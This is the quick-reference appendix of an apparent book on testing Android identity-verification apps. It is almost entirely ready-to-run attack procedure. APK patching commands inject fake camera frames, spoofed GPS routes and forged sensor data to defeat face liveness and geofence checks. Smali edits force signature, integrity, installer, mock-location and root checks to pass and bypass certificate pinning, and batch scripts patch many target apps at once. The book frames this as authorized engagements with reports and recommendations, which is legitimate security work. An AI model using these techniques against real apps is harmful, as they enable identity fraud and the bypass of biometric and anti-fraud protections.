---
title: "Appendix A: Quick Reference"
description: "Commands, payload formats, config schemas, and troubleshooting at a glance"
---

> **Usage:** This appendix consolidates every command, config format, and troubleshooting pattern from the book into a single reference. Print it. Keep it open in a terminal tab. Use it during engagements when you need a quick reminder without searching through chapters.

---

## Patch and Deploy

```bash
# Patch the APK (run from project root where patch-tool.jar lives)
java -jar patch-tool.jar target.apk --out patched.apk --work-dir ./work

# Save patch output for evidence
java -jar patch-tool.jar target.apk --out patched.apk --work-dir ./work 2>&1 | tee patch_output.txt

# Install (uninstall first if signature mismatch)
adb uninstall PKG 2>/dev/null
adb install -r patched.apk

# Grant permissions (all up front — no dialogs during the flow)
adb shell pm grant PKG android.permission.CAMERA
adb shell pm grant PKG android.permission.ACCESS_FINE_LOCATION
adb shell pm grant PKG android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant PKG android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant PKG android.permission.WRITE_EXTERNAL_STORAGE
adb shell appops set PKG MANAGE_EXTERNAL_STORAGE allow    # API 30+

# Launch
adb shell am start -n PKG/.LauncherActivity
# Or if launcher activity is unknown:
adb shell monkey -p PKG -c android.intent.category.LAUNCHER 1

# Find package name from APK
aapt2 dump badging target.apk | grep "package:"
```

> Replace `PKG` with the target app's package name (e.g., `com.poc.biometric`).

---

## Push Payloads

All three injection subsystems auto-enable when their directories contain content. Push everything before launching the app.

```bash
# Camera frames (PNG files or MP4 video)
adb push frames/              /sdcard/poc_frames/

# Location config
adb push location_config.json /sdcard/poc_location/config.json

# Sensor config
adb push sensor_config.json   /sdcard/poc_sensor/config.json
```

### Payload Directories

| Directory | Content | Auto-Enable Trigger |
|-----------|---------|-------------------|
| `/sdcard/poc_frames/` | PNG folders or MP4 videos | Directory has content |
| `/sdcard/poc_location/` | `config.json` | JSON file exists |
| `/sdcard/poc_sensor/` | `config.json` | JSON file exists |

### Clearing Payloads

```bash
adb shell rm -rf /sdcard/poc_frames/*     # Clear camera frames
adb shell rm -f /sdcard/poc_location/*    # Clear location config
adb shell rm -f /sdcard/poc_sensor/*      # Clear sensor config
```

---

## Frame Preparation

```bash
# Extract frames from video (15fps matches liveness SDK processing rate)
ffmpeg -i video.mp4 -vf fps=15 frames/%03d.png

# Extract with resize to common selfie resolution
ffmpeg -i video.mp4 -vf "fps=15,scale=640:480" frames/%03d.png

# Generate solid-color test frames (for overlay verification only)
for i in $(seq -w 1 30); do
  convert -size 640x480 xc:blue "frames/${i}.png"
done
```

### Frame Quality Checklist

| Requirement | Value | Notes |
|------------|-------|-------|
| Resolution | 640x480 or 1280x720 | Match target camera config |
| Format | PNG | Numbered sequentially (001.png, 002.png, ...) |
| Frame rate | 15 fps extraction | Matches typical SDK processing rate |
| Face size | 30%+ of frame area | Too small = face detection fails |
| Lighting | Even, no harsh shadows | Uneven lighting = quality rejection |
| Background | Neutral, solid color | Busy backgrounds increase false negatives |
| Sequence length | 15-30 frames (1-2 sec) | Per action (neutral, tilt, nod) |

---

## Location Config

**File:** `/sdcard/poc_location/config.json`

### Static Location

```json
{
  "latitude": 40.7580,
  "longitude": -73.9855,
  "altitude": 5.0,
  "accuracy": 8.0,
  "speed": 0.0,
  "bearing": 0.0
}
```

### Walking Route (Waypoints)

```json
{
  "waypoints": [
    { "latitude": 40.7580, "longitude": -73.9855, "altitude": 5.0, "accuracy": 8.0, "delayMs": 0 },
    { "latitude": 40.7590, "longitude": -73.9850, "altitude": 5.0, "accuracy": 10.0, "delayMs": 5000 },
    { "latitude": 40.7600, "longitude": -73.9845, "altitude": 5.0, "accuracy": 9.0, "delayMs": 10000 }
  ]
}
```

### Location Config Fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `latitude` | float | *required* | Decimal degrees, WGS84 |
| `longitude` | float | *required* | Decimal degrees, WGS84 |
| `altitude` | float | 0.0 | Meters above sea level |
| `accuracy` | float | 10.0 | Horizontal accuracy in meters (jittered +/-2m) |
| `speed` | float | 0.0 | Meters per second |
| `bearing` | float | 0.0 | Degrees (0-360, 0 = North) |

### Common Test Coordinates

| Location | Latitude | Longitude |
|----------|----------|-----------|
| Times Square, NYC | 40.7580 | -73.9855 |
| Googleplex, Mountain View | 37.4220 | -122.0841 |
| City of London | 51.5074 | -0.1278 |
| Shibuya, Tokyo | 35.6595 | 139.7004 |

---

## Sensor Config

**File:** `/sdcard/poc_sensor/config.json`

```json
{
  "accelX": 0.1,
  "accelY": 9.5,
  "accelZ": 2.5,
  "gyroX": 0.0,
  "gyroY": 0.0,
  "gyroZ": 0.0,
  "magX": 0.0,
  "magY": 25.0,
  "magZ": -45.0,
  "jitter": 0.15,
  "proximity": 5.0,
  "light": 300.0
}
```

### Sensor Config Fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `accelX/Y/Z` | float | 0, 0, 9.81 | Accelerometer in m/s^2 |
| `gyroX/Y/Z` | float | 0, 0, 0 | Gyroscope in rad/s |
| `magX/Y/Z` | float | 0, 25, -45 | Magnetometer in microteslas |
| `jitter` | float | 0.15 | Noise amplitude per axis per reading |
| `proximity` | float | 5.0 | Distance to nearest object (cm) |
| `light` | float | 300.0 | Ambient light level (lux) |

### Sensor Values for Common Scenarios

| Scenario | accelX | accelY | accelZ | gyroZ | jitter |
|----------|--------|--------|--------|-------|--------|
| Flat on desk | 0 | 0 | 9.81 | 0 | 0.05 |
| Holding upright (selfie) | 0.1 | 9.5 | 2.5 | 0 | 0.15 |
| Tilt left | 3.0 | 0 | 9.31 | -0.15 | 0.15 |
| Tilt right | -3.0 | 0 | 9.31 | 0.15 | 0.15 |
| Nod down | 0 | 3.0 | 9.31 | 0 | 0.15 |
| Walking | 0.5 | 8.0 | 5.0 | 0 | 0.3 |

### Android Sensor Coordinate System

- **X** = lateral (positive = right)
- **Y** = longitudinal (positive = up)
- **Z** = perpendicular to screen (positive = out)
- At rest: `sqrt(accelX^2 + accelY^2 + accelZ^2) ≈ 9.81` (Earth's gravity)

### Matched Pairs (Camera + Sensor)

| Camera Frames | Sensor Config | Use Case |
|--------------|---------------|----------|
| `neutral/` | `holding.json` | Passive liveness, static selfie |
| `tilt_left/` | `tilt-left.json` | "Tilt left" active liveness |
| `tilt_right/` | `tilt-right.json` | "Tilt right" active liveness |
| `nod/` | `nod.json` | "Nod" active liveness |
| `blink/` | `holding.json` | "Blink" (facial only, no device motion) |

---

## Recon Commands

```bash
# Decode APK
apktool d target.apk -o decoded/

# Camera — CameraX indicators
grep -rl "ImageAnalysis\$Analyzer\|ImageProxy\|OnImageCapturedCallback" decoded/smali*/

# Camera — Camera2 indicators
grep -rl "OnImageAvailableListener\|CameraCaptureSession\|SurfaceTexture" decoded/smali*/

# Location — callback paths
grep -rn "onLocationResult\|onLocationChanged\|getLastKnownLocation" decoded/smali*/

# Location — mock detection
grep -rn "isFromMockProvider\|isMock" decoded/smali*/

# Sensors — motion data
grep -rn "onSensorChanged" decoded/smali*/

# Sensor types — specific hardware
grep -rn "TYPE_ACCELEROMETER\|TYPE_GYROSCOPE\|TYPE_MAGNETIC_FIELD" decoded/smali*/

# Geofence coordinates
grep -rn "latitude\|longitude\|LatLng\|geofence" decoded/smali*/
grep -rn "latitude\|longitude" decoded/res/values/strings.xml

# Liveness challenge types
grep -rn "tilt\|nod\|blink\|smile\|turn\|TILT\|NOD\|BLINK" decoded/smali*/

# Third-party SDKs
grep -rl "com/google/mlkit" decoded/smali*/           # ML Kit
grep -rl "liveness\|verification\|biometric" decoded/smali*/  # Commercial SDKs

# Evasion surfaces
grep -rn "getPackageInfo\|GET_SIGNATURES\|MessageDigest" decoded/smali*/   # Signature check
grep -rn "classes\.dex\|getCrc\|ZipEntry" decoded/smali*/                  # DEX integrity
grep -rn "getInstallingPackageName\|com\.android\.vending" decoded/smali*/ # Installer check
grep -rn "CertificatePinner" decoded/smali*/                               # Cert pinning
grep -rn "su\b\|/system/xbin\|Superuser\|magisk" decoded/smali*/          # Root detection
grep -rn "goldfish\|sdk_gphone\|Build\.FINGERPRINT" decoded/smali*/        # Emulator detection
```

---

## Monitor and Verify

```bash
# Monitor camera injection
adb logcat -s FrameInterceptor

# Monitor location injection
adb logcat -s LocationInterceptor

# Monitor sensor injection
adb logcat -s SensorInterceptor

# Monitor all three simultaneously
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor

# Monitor hook engine and bootstrap
adb logcat -s HookEngine,ActivityLifecycleHook,OverlayController

# Monitor everything injection-related
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor,HookEngine,FrameStore,OverlayController
```

### Expected Logcat Output

```text
D FrameInterceptor: FRAME_DELIVERED idx=0 folder=face_neutral
D FrameInterceptor: FRAME_CONSUMED toBitmap
D LocationInterceptor: LOCATION_DELIVERED lat=40.758002 lng=-73.985498 acc=9.2
D SensorInterceptor: SENSOR_DELIVERED type=1 values=[0.12, 9.48, 2.53]
```

---

## Evidence Collection

```bash
# Screenshot
adb exec-out screencap -p > screenshot.png

# Capture delivery log (background — start before launch)
adb logcat -c
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor > delivery_log.txt &
LOGCAT_PID=$!

# Stop capture
kill $LOGCAT_PID

# Dump current log (one-shot, no background process)
adb logcat -d -s FrameInterceptor,LocationInterceptor,SensorInterceptor > delivery.log

# Delivery statistics
echo "Frames delivered:   $(grep -c 'FRAME_DELIVERED' delivery.log)"
echo "Frames consumed:    $(grep -c 'FRAME_CONSUMED' delivery.log)"
echo "Locations delivered: $(grep -c 'LOCATION_DELIVERED' delivery.log)"
echo "Sensor events:      $(grep -c 'SENSOR_DELIVERED' delivery.log)"

# Accept rate
DELIVERED=$(grep -c 'FRAME_DELIVERED' delivery.log)
CONSUMED=$(grep -c 'FRAME_CONSUMED' delivery.log)
[ "$DELIVERED" -gt 0 ] && echo "Accept rate: $(( CONSUMED * 100 / DELIVERED ))%"

# Export structured delivery log (broadcast-based)
adb logcat -c && adb shell "am broadcast -a com.hookengine.EXPORT_LOG" 2>/dev/null
sleep 2
adb pull /sdcard/poc_logs/delivery.log .
```

### Delivery Event Types

| Event | Subsystem | Meaning |
|-------|-----------|---------|
| `FRAME_DELIVERED` | Camera | Fake frame injected into pipeline |
| `FRAME_CONSUMED` | Camera | `toBitmap()` called on FakeImageProxy |
| `FRAME_ANALYZE_ENTER` | Camera | `analyze()` entered with our frame |
| `FRAME_CAPTURE` | Camera | ImageCapture callback fired with our frame |
| `LOCATION_DELIVERED` | Location | Fake Location constructed and returned |
| `LOCATION_CALLBACK_HIT` | Location | `onLocationResult` fired with our coords |
| `LOCATION_LISTENER_HIT` | Location | `onLocationChanged` fired with our coords |
| `LOCATION_GETLAST_HIT` | Location | `getLastKnownLocation` returned our coords |
| `SENSOR_DELIVERED` | Sensor | Fake sensor values injected into event |
| `SENSOR_LISTENER_HIT` | Sensor | `onSensorChanged` fired with our values |

---

## Smali Quick Reference

### Type Notation

| Smali | Java | Example |
|-------|------|---------|
| `V` | void | Return type |
| `Z` | boolean | `const/4 v0, 0x1` = true |
| `I` | int | `const/4 v0, 0x0` = 0 |
| `J` | long | Wide (uses 2 registers) |
| `F` | float | `const v0, 0x41200000` = 10.0f |
| `D` | double | Wide (uses 2 registers) |
| `Ljava/lang/String;` | String | Object type |
| `[B` | byte[] | Array type |
| `[I` | int[] | Array type |

### Hook Patterns

```smali
# Pattern 1: Method entry injection
.method public analyze(Landroidx/camera/core/ImageProxy;)V
    # INSERT HOOK HERE (before existing code)
    invoke-static {p1}, Lcom/hookengine/FrameInterceptor;->intercept(Landroidx/camera/core/ImageProxy;)V
    ...existing code...
.end method

# Pattern 2: Call-site interception (redirect invoke)
# BEFORE:
invoke-virtual {v0, v1}, Lcom/target/Foo;->bar(I)V
# AFTER:
invoke-static {v0, v1}, Lcom/hook/Intercept;->bar(Lcom/target/Foo;I)V

# Pattern 3: Force return value (bypass check)
.method public isValid()Z
    .registers 1
    const/4 v0, 0x1
    return v0
.end method
```

### Register Rules

- `p0` = `this` (in instance methods), `p1`+ = parameters
- `v0`+ = local variables
- `.locals N` = number of local registers (v0 through vN-1)
- `.registers N` = total registers (locals + params)
- Bump `.locals` or `.registers` when adding new local variables

---

## Evasion Patterns

| Defense | Technique | Smali Change |
|---------|-----------|-------------|
| Signature check | Force return true | `const/4 v0, 0x1; return v0` in verify method |
| DEX integrity | Nop the branch | Replace `if-nez v0, :fail` with `nop` |
| Installer check | Force return value | Return `"com.android.vending"` string |
| Cert pinning | Patch XML | Add `<certificates src="user" />` to `network_security_config.xml` |
| Mock location | Patched at call site | `isFromMockProvider()` / `isMock()` return `false` |
| Root detection | Force return false | `const/4 v0, 0x0; return v0` in detection method |

---

## Batch Operations

```bash
# Patch all APKs in a directory
for apk in targets/*.apk; do
    name=$(basename "$apk" .apk)
    java -jar patch-tool.jar "$apk" \
        --out "patched/${name}-patched.apk" \
        --work-dir "work/$name" 2>&1 | tee "reports/${name}_patch.log"
done

# Deploy, launch, and capture logs for all patched APKs
for apk in patched/*-patched.apk; do
    name=$(basename "$apk" -patched.apk)
    pkg=$(aapt2 dump badging "$apk" 2>/dev/null | grep "package:" | sed "s/.*name='\([^']*\)'.*/\1/")
    adb install -r "$apk"
    adb shell monkey -p "$pkg" -c android.intent.category.LAUNCHER 1
    sleep 5
    adb logcat -d -s FrameInterceptor,LocationInterceptor,SensorInterceptor > "reports/${name}.log"
    adb shell am force-stop "$pkg"
done

# Summary table
printf "%-25s %8s %8s %8s %s\n" "TARGET" "FRAMES" "LOCS" "SENSORS" "STATUS"
for log in reports/*.log; do
    name=$(basename "$log" .log)
    f=$(grep -c FRAME_DELIVERED "$log" 2>/dev/null || echo 0)
    l=$(grep -c LOCATION_DELIVERED "$log" 2>/dev/null || echo 0)
    s=$(grep -c SENSOR_DELIVERED "$log" 2>/dev/null || echo 0)
    st="FAILED"; [ "$f" -gt 0 ] || [ "$l" -gt 0 ] || [ "$s" -gt 0 ] && st="ACTIVE"
    printf "%-25s %8s %8s %8s %s\n" "$name" "$f" "$l" "$s" "$st"
done
```

---

## Engagement Checklist

```text
RECON
[ ] Obtain target APK
[ ] Decode with apktool
[ ] Identify Application class
[ ] Map camera hook surfaces (CameraX / Camera2)
[ ] Map location hook surfaces (Fused / Legacy)
[ ] Map sensor hook surfaces
[ ] Identify mock detection methods
[ ] Extract geofence coordinates (if applicable)
[ ] Identify liveness challenge type (passive / active)
[ ] Identify third-party SDKs
[ ] Document findings in recon report

PREPARE
[ ] Patch APK with patch-tool (save output)
[ ] Cross-reference patch output with recon report
[ ] Install patched APK
[ ] Grant all permissions
[ ] Prepare camera payloads (face frames + document images)
[ ] Prepare location config (coordinates from recon)
[ ] Prepare sensor config (matched to camera frames)
[ ] Push all payloads to device
[ ] Verify payload directories populated

EXECUTE
[ ] Start logcat capture (background)
[ ] Launch patched app
[ ] Verify injection active (logcat or overlay)
[ ] Complete each verification step:
    [ ] Step 1: _____________ -> Result: _____
    [ ] Step 2: _____________ -> Result: _____
    [ ] Step 3: _____________ -> Result: _____
[ ] Screenshot at each step
[ ] Switch payloads between steps as needed
[ ] Stop logcat capture

REPORT
[ ] Export delivery statistics
[ ] Compile evidence (screenshots + logs + patch output)
[ ] Write engagement report
[ ] Include delivery statistics with accept rates
[ ] Include actionable recommendations
[ ] Archive all artifacts
```

---

## Troubleshooting

### Installation Issues

| Symptom | Cause | Fix |
|---------|-------|-----|
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | Signature mismatch with installed version | `adb uninstall PKG` first |
| `INSTALL_FAILED_OLDER_SDK` | APK requires newer Android | Use emulator with matching API level |
| Permission denied on payload push | Storage permission not granted | `adb shell appops set PKG MANAGE_EXTERNAL_STORAGE allow` |

### Hook Issues

| Symptom | Cause | Fix |
|---------|-------|-----|
| No `FRAME_DELIVERED` in logcat | No frames in `/sdcard/poc_frames/` | Push frame PNGs to device |
| `FRAME_DELIVERED` but no `FRAME_CONSUMED` | App doesn't call `toBitmap()` on this path | Check recon — might use different processing |
| No `LOCATION_DELIVERED` | App hasn't queried location yet | Navigate to the location step |
| "Mock location detected" | Non-standard mock detection method | Check for proprietary anti-spoofing SDK |
| No `SENSOR_DELIVERED` | App has no `SensorEventListener` | Verify recon — sensors may not be used |

### Runtime Issues

| Symptom | Cause | Fix |
|---------|-------|-----|
| "already patched, skipping" in logcat | APK was previously patched | Safe to ignore — idempotent |
| "SurfaceViewImplementation already patched" | CameraX preview hook already present | Safe to ignore |
| App crashes on launch | Hook register count wrong or missing class | Check patch-tool output for errors |
| Liveness fails despite active injection | Sensor/camera mismatch | Match sensor config to camera frame sequence |
| Geofence fails | Wrong coordinates | Re-check recon for exact bounds |
| SDK timeout | Flow took too long | Pre-stage everything, automate payload switches |

### Recovery

```bash
# Kill and restart the app (hooks still armed)
adb shell am force-stop PKG
adb shell am start -n PKG/.LauncherActivity

# Full reset (clear app data)
adb shell pm clear PKG

# Check if injection is active
adb logcat -d -s FrameInterceptor | tail -5
adb logcat -d -s LocationInterceptor | tail -5
adb logcat -d -s SensorInterceptor | tail -5
```

---

## Target Catalog Template

```yaml
package: com.example.app
version_tested: "1.0.0"
last_tested: "2026-03-16"
camera_api: camerax            # camerax | camera2 | both | none
location_api: fused            # fused | legacy | both | none
sensors: accel + gyro          # accel | gyro | mag | none
liveness_type: active          # passive | active | none
active_challenges:
  - tilt_left
  - tilt_right
  - nod
anti_tamper:
  signature_check: none        # method name or "none"
  dex_integrity: none
  cert_pinning: none
  installer_check: none
hooks_applied:
  - "analyze(): com/example/FaceAnalyzer.smali"
  - "onLocationResult(): com/example/LocationCheck.smali"
payloads_used:
  frames: "face_neutral/"
  location: "times-square.json"
  sensors: "holding.json"
result: FULL_BYPASS             # FULL_BYPASS | PARTIAL | FAILED
notes: |
  Additional observations here.
```

---

## Engagement Report Template

```markdown
# Engagement Report

## Target
- **Application:** <app name>
- **Package:** <package name>
- **Version:** <version>
- **Date:** <date>

## Recon Summary
- **Camera API:** CameraX / Camera2 / Both
- **Location API:** FusedLocationProvider / LocationManager / Both
- **Sensors:** Accelerometer / Gyroscope / Both / None
- **Liveness type:** Passive / Active (challenges: ___) / None
- **Geofence:** Yes (lat, lng, radius) / No
- **Mock detection:** isFromMockProvider / isMock / Settings.Secure / None

## Hooks Applied
<paste patch-tool output>

## Payloads Used
- **Camera frames:** <folder, frame count, resolution>
- **Location config:** <coordinates, accuracy>
- **Sensor config:** <profile or custom values>

## Results

### Step 1: <step name>
- **Result:** PASS / FAIL
- **Frames delivered:** <count>
- **Frames consumed:** <count>
- **Accept rate:** <percentage>
- **Notes:** <observations>

### Step 2: <step name>
- **Result:** PASS / FAIL
- **Deliveries:** <count>
- **Notes:** <observations>

## Overall Result
- **Outcome:** FULL BYPASS / PARTIAL / FAILED
- **All steps completed with injected data:** Yes / No

## Delivery Statistics
- Frames delivered: <total>
- Frames consumed: <total>
- Frame accept rate: <percentage>
- Locations delivered: <total>
- Sensor events delivered: <total>

## Evidence
- delivery_log.txt
- step1_screenshot.png
- step2_screenshot.png
- patch_output.txt

## Recommendations
1. <Recommendation with impact and implementation guidance>
2. <Recommendation>
3. <Recommendation>
```
